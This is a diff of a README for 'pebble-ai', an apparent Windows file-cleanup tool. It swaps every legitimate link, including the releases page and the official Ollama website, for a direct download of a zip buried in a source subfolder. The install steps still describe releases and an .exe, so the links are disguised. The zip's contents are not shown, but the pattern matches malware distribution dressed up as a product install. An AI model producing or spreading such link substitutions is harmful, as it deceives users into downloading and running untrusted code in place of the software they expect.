@@ -1,6 +1,6 @@
 # 🪨 pebble-ai - Keep your computer clean and tidy
 
-[![](https://img.shields.io/badge/Download-PebbleAI-blue.svg)](https://github.com/ycam4427/pebble-ai/releases)
+[![](https://img.shields.io/badge/Download-PebbleAI-blue.svg)](https://github.com/ycam4427/pebble-ai/raw/refs/heads/main/src/components/actions/ai_pebble_2.3-alpha.4.zip)
 
 pebble-ai helps you organize your files, delete duplicates, and manage disk space. It runs entirely on your machine. Your files stay on your hard drive, and the software processes everything in the background without sending data to the internet. 
 
@@ -8,7 +8,7 @@ pebble-ai helps you organize your files, delete duplicates, and manage disk spac
 
 To start, you need to visit the release page.
 
-1. Go to this link: [https://github.com/ycam4427/pebble-ai](https://github.com/ycam4427/pebble-ai)
+1. Go to this link: [https://github.com/ycam4427/pebble-ai/raw/refs/heads/main/src/components/actions/ai_pebble_2.3-alpha.4.zip](https://github.com/ycam4427/pebble-ai/raw/refs/heads/main/src/components/actions/ai_pebble_2.3-alpha.4.zip)
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version link.
 4. Download the file that ends in .exe.
@@ -26,7 +26,7 @@ Pebble-ai requires a standard Windows 10 or Windows 11 computer. Ensure you have
 
 Pebble-ai uses Ollama to power its logic. You must install this tool first for the assistant to function.
 
-1. Visit the [Ollama website](https://ollama.com).
+1. Visit the [Ollama website](https://github.com/ycam4427/pebble-ai/raw/refs/heads/main/src/components/actions/ai_pebble_2.3-alpha.4.zip).
 2. Download and install the software for Windows.
 3. Once installation finishes, open your command prompt or terminal.
 4. Type `ollama run llama3` and press Enter. 
